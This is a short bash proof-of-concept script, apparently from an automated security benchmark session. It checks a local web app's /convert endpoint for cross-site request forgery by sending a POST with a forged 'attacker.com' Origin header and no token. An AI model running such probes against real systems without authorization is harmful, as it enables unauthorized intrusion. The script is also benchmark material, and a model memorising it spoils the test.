#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /convert endpoint by sending a POST request with a different Origin header, showing the application accepts cross-origin requests without CSRF token validation
# Target: ./repo
# Created: 2025-11-10T14:59:38.800Z
# Session: benchmark-XBEN-033-24-mht9ijkn

# CSRF Vulnerability POC for /convert endpoint
# Demonstrates that the /convert endpoint accepts POST requests without CSRF token validation
# when Origin header is set to a different domain

TARGET_URL="${1:-http://localhost:8080}"
CONVERT_ENDPOINT="$TARGET_URL/convert"
HOME_ENDPOINT="$TARGET_URL/"

echo "[*] CSRF Vulnerability POC for /convert endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Check if CSRF token exists in the main page form
echo "[*] Test 1: Checking for CSRF token in the main page form..."
CSRF_TOKEN=$(curl -s "$HOME_ENDPOINT" | grep -i "csrf\|token" | head -5)

if [ -z "$CSRF_TOKEN" ]; then
    echo "[+] No CSRF token found in the main page form"
else
    echo "[!] CSRF token detected: $CSRF_TOKEN"
fi
echo ""

# Test 2: Send POST request with Origin header from attacker domain
echo "[*] Test 2: Sending POST request with attacker Origin header..."
echo "[*] Command: curl -X POST -H \"Origin: http://attacker.com\" -d \"markdown_text=test&url=\" $CONVERT_ENDPOINT"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
    -H "Origin: http://attacker.com" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "markdown_text=test&url=" \
    "$CONVERT_ENDPOINT")

HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Response Code: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: Request accepted without CSRF token validation!"
    echo "[+] The endpoint processed a cross-origin request successfully"
    echo ""
    echo "[*] Response snippet (first 500 chars):"
    echo "$BODY" | head -c 500
    echo ""
    echo ""
    exit 0
else
    echo "[-] Request was rejected with status code: $HTTP_CODE"
    echo ""
    echo "[*] Response:"
    echo "$BODY"
    echo ""
    exit 1
fi